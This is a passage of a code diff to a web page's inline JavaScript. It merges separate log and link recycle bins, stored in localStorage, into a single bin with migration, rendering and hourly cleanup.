-        .replace(/"/g, '&quot;');
-}
-
-// ── INIT ────────────────────────────────────────────────────────────────────
+// ── INIT ──────────────────────────────────────────────────
 document.getElementById('refreshBtn').onclick = () => location.reload();
-document.getElementById('binSearch').oninput     = renderLogBin;
-document.getElementById('linkBinSearch').oninput = renderLinkBin;
+migrateLegacyBins();
+cleanBin();
+renderBin();
+setInterval(cleanBin, 3600000);
 
-document.getElementById('emptyBinBtn').onclick = () => {
-    if (!confirm('Permanently delete ALL items in Log Recycle Bin? This cannot be undone.')) return;
-    localStorage.setItem('recycle_bin', '[]');
-    renderLogBin();
-    showToast('🔥 Log bin emptied.', '#dc3545');
-};
-document.getElementById('emptyLinkBinBtn').onclick = () => {
-    if (!confirm('Permanently delete ALL items in Link Recycle Bin? This cannot be undone.')) return;
-    localStorage.setItem('link_bin', '[]');
-    renderLinkBin();
-    showToast('🔥 Link bin emptied.', '#dc3545');
-};
-
-cleanBins();
-renderLogBin();
-renderLinkBin();
-setInterval(cleanBins, 3600000);
 </script>
 </body>
 </html>
